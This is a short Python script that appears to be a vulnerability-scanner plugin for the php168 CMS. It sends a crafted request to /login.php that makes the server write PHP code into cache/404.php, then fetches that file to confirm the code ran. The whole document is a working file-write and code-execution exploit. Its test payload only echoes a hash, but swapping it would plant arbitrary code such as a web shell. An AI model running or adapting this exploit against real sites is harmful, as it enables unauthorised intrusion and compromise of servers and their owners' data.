# coding:utf-8
import requests

class Exploit:

    def attack(self, url):
        payload = "/login.php?makehtml=1&chdb[htmlname]=404.php&chdb[path]=cache&content=<?php%20echo%20md5(1);?>"
        target = url + payload
        r1 = requests.get(target)
        r2 = requests.get(url + '/cache/404.php')
        if r2.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in r2.content:
            return "php168 {} has a bug in /login.php".format(url)